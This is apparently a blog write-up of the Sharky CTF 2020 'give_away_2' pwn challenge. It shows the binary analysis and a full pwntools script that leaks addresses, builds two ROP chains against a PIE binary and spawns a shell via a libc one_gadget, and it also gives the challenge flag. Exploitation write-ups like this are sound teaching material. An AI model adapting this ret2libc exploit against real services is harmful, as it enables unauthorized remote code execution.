---
title: "Sharky CTF 2020: give_away_2 (Pwn)"
layout: post
date: 2020-05-12
tags:
- CTF
- writeup
- Sharky CTF 2020
- Pwn
comments: true
---

> Make good use of this gracious give away.
>
> Creator: Hackhim
>
> [give\_away\_2](/files/give_away_2)
>
> [libc-2.27.so](/files/libc-2.27-x64.so)

As with most pwn challenges, let's start off by checking what kind of binary we're given.

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_two$ file give_away_2
give_away_2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=5c93b7c4ff1a036cb291045d3ab76155d22ce1a6, not stripped
```

Okay, it's just a 64 bit ELF binary. Let's run it to get a better idea of what it does.

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_two$ ./give_away_2
Give away: 0x560f72579864

```

Seems like it just prints a hex value and gets some input from us. Hmm, this is very similar to [give_away_1](../sharky-ctf-give_away_one). Perhaps we should also test if the input is vulnerable to buffer overflow?

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_two$ python -c 'print "A"*1024' | ./give_away_2
Give away: 0x55d1ba2a0864
Segmentation fault (core dumped)
```

Yup I guess this is vulnerable too. Let's open up the binary in IDA and see what the hex value is.

```
lea     rsi, main
lea     rdi, format     ; "Give away: %p\n"
mov     eax, 0
call    printf ; printf("Give away: %p\n", main);
```

Oh that's perculiar, we're given the address of `main` instead. Why would be possibly need that? This rings some bells. Let's try checking what security features this binary has. We can do this with the [checksec](http://www.trapkit.de/tools/checksec.html) utility.

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_two$ checksec give_away_2
[*] '/vagrant/challenges/sharky/give_away_two/give_away_2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Okay, that explains it. This is a [Position Independent Executable (PIE)](https://codywu2010.wordpress.com/2014/11/29/about-elf-pie-pic-and-else/). In the context of this challenge, it means that the address of `main` would be every run (assuming [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is turned on). We can verify this by running the binary multiple times.

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_two$ ./give_away_2
Give away: 0x55d3de27b864
asdf
vagrant@ctf:/vagrant/challenges/sharky/give_away_two$ ./give_away_2
Give away: 0x559fd6f12864
asdf
vagrant@ctf:/vagrant/challenges/sharky/give_away_two$ ./give_away_2
Give away: 0x55803ddf9864
asdf
```

Given that the binary leaks the address of `main`, PIE is not much of an issue for us since we can now calculate the (base) address that the binary is loaded at.

```
base address = leaked main address - offset of main within the binary
```

As with give\_away\_1, we still need to get a shell on the system. Since this is a 64 bit ELF, there's a nifty trick that we can use. Instead of calling `system("/bin/sh")`, we can use [one_gadget](https://github.com/david942j/one_gadget) to find a single gadget that can spawn a shell for us.

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_two$ one_gadget libc-2.27.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

As seen above, there's a set of constraints we have to fulfil for each one\_gadget. Let's go with the second one (0x4f322) because I think it's more probable than `rcx` being `NULL`. One caveat is that the addresses above are relative to where libc is is going to be loaded. Since we don't have a leak to a libc address (as with give\_away\_one), we have to leak it ourself. An easy way to do this is to use the printf function in main. This also kills two birds with one stone, because `vuln` will conveniently be called a second time which allows us to send the payload to call the one\_gadget.

```
.text:0000000000000872    lea     rsi, main
.text:0000000000000879    lea     rdi, format ; "Give away: %p\n"
.text:0000000000000880    mov     eax, 0
.text:0000000000000885    call    printf
```

As seen above, the offset of `printf` within the binary is 0x885 so we can just add it to the base address that we calculated earlier. We can call printf against it's own entry in the [Global Offset Table (GOT)](https://en.wikipedia.org/wiki/Global_Offset_Table) to leak the libc address of printf.

Okay so let's summarize our plan of attack:

1. Leak the address of main (given to us)
2. Calculate binary base address
3. Calcuate the address of print in main
4. Send first ropchain to call `printf(<address of printf@GOT>)`
5. Calculate libc base address based on leaked printf libc address
6. Send second ropchain to call one\_gadget
7. Profit

Our first ropchain should look like this:

```
<padding of ? bytes><gadget: pop rdi; ret;><address(printf@GOT)><address(printf@main)>
```

Our second ropchain should look like this:

```
<padding of ? bytes><address(one_gadget)>
```

All we need now is the padding. Let's go for a more automated approach this time because why not? I've integrated it into the solve script below.

```python
#! /usr/bin/python2

import os
from pwn import *

HOST = 'sharkyctf.xyz'
PORT = 20335
BINARY = './give_away_2'

elf = context.binary = ELF(BINARY)
libc = ELF('./libc-2.27.so')

# Gadgets

libc.symbols['one_gadget'] = 0x4f322

'''
One Gadget
----------
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
'''

# Offsets

elf.symbols['main_printf'] = 0x885

'''
.text:0000000000000872    lea     rsi, main
.text:0000000000000879    lea     rdi, format ; "Give away: %p\n"
.text:0000000000000880    mov     eax, 0
.text:0000000000000885    call    printf
'''

# RIP Padding

p = process(BINARY)
p.sendline(cyclic(64, n=8))
p.wait()

core = p.corefile

p.close()
os.remove(core.file.name)

PAYLOAD_PADDING = cyclic_find(core.read(core.rsp, 8), n=8)

log.success('Found padding length: {}'.format(PAYLOAD_PADDING))

# Start connection

r = remote(HOST, PORT)

# Stage 1: Get main leak

main = int(r.recvline().split()[2][2:], 16)
log.info('Leaked main address: 0x{:x}'.format(main))

# Stage 2: Build Rop Chain (leak printf@libc)

elf.address = main - elf.symbols.main
log.info('Calculated base address: 0x{:x}'.format(elf.address))

rop = ROP(elf)
rop.main_printf(elf.got.printf)

log.success('Built ROP Chain (Leak printf@libc)')
log.success(rop.dump())

# Stage 3: Leak printf@libc

r.sendline(fit({ PAYLOAD_PADDING: rop.chain() }))
log.success('Sent payload')

libc_printf = u64(r.recvn(6) + '\x00\x00')  # Fix address width
log.info('Leaked printf@libc address: 0x{:x}'.format(libc_printf))


# Stage 4: Build ROP Chain (Call one_gadget)

libc.address = libc_printf - libc.symbols['printf']
log.info('Calculated libc base address : 0x{:x}'.format(libc.address))

rop1 = ROP([elf, libc])
rop1.one_gadget()

log.success('Built ROP Chain (Call one_gadget)')
log.success(rop1.dump())

# Stage 5: Pwn

r.sendline(fit({ PAYLOAD_PADDING: rop1.chain() }))

log.success('Sent payload')
log.progress('Spawning a shell...')

r.interactive()
```

Let's see it in action!

<script id="asciicast-329300" src="https://asciinema.org/a/329300.js" async></script>

Flag: `shkCTF{It's_time_to_get_down_to_business}`
